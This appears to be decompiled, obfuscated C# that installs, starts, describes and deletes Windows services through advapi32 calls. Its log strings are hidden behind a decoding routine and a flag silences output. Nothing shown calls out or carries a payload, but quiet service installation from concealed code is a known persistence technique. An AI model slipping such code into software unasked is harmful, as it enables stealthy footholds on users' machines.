using System;
using System.Runtime.InteropServices;

namespace ns0;

internal class Class18
{
	internal enum Enum12
	{
		const_0 = 2,
		const_1
	}

	[DllImport("advapi32.dll")]
	internal static extern IntPtr OpenSCManager(string string_0, string string_1, int int_0);

	[DllImport("Advapi32.dll")]
	internal static extern IntPtr CreateService(IntPtr intptr_0, string string_0, string string_1, int int_0, int int_1, int int_2, int int_3, string string_2, string string_3, int int_4, string string_4, string string_5, string string_6);

	[DllImport("advapi32.dll")]
	internal static extern void CloseServiceHandle(IntPtr intptr_0);

	[DllImport("advapi32.dll")]
	internal static extern int StartService(IntPtr intptr_0, int int_0, string string_0);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern IntPtr OpenService(IntPtr intptr_0, string string_0, int int_0);

	[DllImport("advapi32.dll")]
	internal static extern int DeleteService(IntPtr intptr_0);

	[DllImport("kernel32.dll")]
	internal static extern int GetLastError();

	internal static bool smethod_0(string string_0, string string_1, string string_2, bool bool_0, bool bool_1, string string_3, Enum12 enum12_0)
	{
		int int_ = 2;
		int int_2 = 16;
		int int_3 = 1;
		int int_4 = 983551;
		try
		{
			IntPtr intptr_ = OpenSCManager(null, null, int_);
			if (intptr_.ToInt32() != 0)
			{
				IntPtr intptr_2 = CreateService(intptr_, string_1, string_2, int_4, int_2, (int)enum12_0, int_3, string_0, null, 0, null, null, null);
				if (intptr_2.ToInt32() != 0)
				{
					if (string_3 != Class28.smethod_0(306171607, 459713766, 1561404463) && !smethod_2(string_1, string_3))
					{
						smethod_4(Class28.smethod_0(509495027, 459713704, 1561404525), bool_1);
					}
					if (bool_0 && StartService(intptr_2, 0, null) == 0)
					{
						smethod_4(Class28.smethod_0(508919618, 459713686, 1561404417), bool_1);
					}
					smethod_5(Class28.smethod_0(2038542992, 459713618, 1561404435), bool_1);
					CloseServiceHandle(intptr_);
					return true;
				}
				smethod_3(Class28.smethod_0(466659996, 459713766, 1561404447), bool_1);
				CloseServiceHandle(intptr_);
			}
			else
			{
				smethod_3(Class28.smethod_0(328761283, 459713566, 1561404515), bool_1);
			}
		}
		catch (Exception ex)
		{
			smethod_3(ex.ToString(), bool_1);
		}
		return false;
	}

	internal static bool smethod_1(string string_0, bool bool_0)
	{
		try
		{
			IntPtr intptr_ = OpenSCManager(null, null, 1073741824);
			if (intptr_.ToInt32() != 0)
			{
				IntPtr intptr_2 = OpenService(intptr_, string_0, 65536);
				if (intptr_2.ToInt32() != 0)
				{
					if (DeleteService(intptr_2) != 0)
					{
						smethod_5(Class28.smethod_0(1907231720, 459714044, 1561404527), bool_0);
						CloseServiceHandle(intptr_);
						return true;
					}
					smethod_3(Class28.smethod_0(1289849689, 459713970, 1561404441), bool_0);
					CloseServiceHandle(intptr_);
					return false;
				}
				smethod_3(Class28.smethod_0(2009360341, 459713898, 1561404439), bool_0);
			}
			else
			{
				smethod_3(Class28.smethod_0(776967173, 459713846, 1561404515), bool_0);
			}
		}
		catch (Exception ex)
		{
			smethod_3(ex.ToString(), bool_0);
		}
		return false;
	}

	internal static bool smethod_2(string string_0, string string_1)
	{
		if (string_1 == Class28.smethod_0(2075091308, 459714108, 1561404463))
		{
			return true;
		}
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		Class13.Struct10 struct10_ = default(Class13.Struct10);
		struct10_.string_0 = string_1;
		try
		{
			num = Class13.OpenSCManagerA(null, null, Class13.Enum7.const_6);
			if (num < 1)
			{
				return false;
			}
			num2 = Class13.LockServiceDatabase(num);
			if (num2 < 1)
			{
				return false;
			}
			num3 = Class13.OpenServiceA(num, string_0, Class13.Enum8.const_9);
			if (num3 < 1)
			{
				return false;
			}
			return Class13.ChangeServiceConfig2A(num3, Class13.Enum10.const_0, ref struct10_);
		}
		catch
		{
		}
		finally
		{
			if (num3 > 0)
			{
				Class13.CloseServiceHandle(num3);
			}
			if (num2 > 0)
			{
				Class13.UnlockServiceDatabase(num2);
			}
			if (num != 0)
			{
				Class13.CloseServiceHandle(num);
			}
		}
		return false;
	}

	internal static void smethod_3(string string_0, bool bool_0)
	{
		smethod_5(Class28.smethod_0(1422464769, 459714108, 1561404449) + string_0, bool_0);
	}

	internal static void smethod_4(string string_0, bool bool_0)
	{
		smethod_5(Class28.smethod_0(1669376361, 459714094, 1561404477) + string_0, bool_0);
	}

	internal static void smethod_5(string string_0, bool bool_0)
	{
		if (!bool_0)
		{
			Console.WriteLine(string_0);
		}
	}
}
